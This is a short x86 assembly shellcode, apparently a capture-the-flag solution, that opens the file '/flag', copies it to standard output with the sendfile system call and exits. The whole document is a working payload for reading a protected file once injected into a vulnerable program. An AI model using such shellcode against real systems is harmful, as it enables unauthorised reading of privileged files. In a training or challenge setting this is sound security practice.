.global _start
_start:
.intel_syntax noprefix
	mov eax, 5
	lea ebx, [rip+flag]
	mov ecx, 0
	int 0x80

	mov ebx, 1
	mov ecx, eax
	mov edx, 0
	mov esi, 1000
	mov eax, 0xbb
	int 0x80

	mov eax, 1
	xor ebx, ebx
	int 0x80

flag:
	.string "/flag"
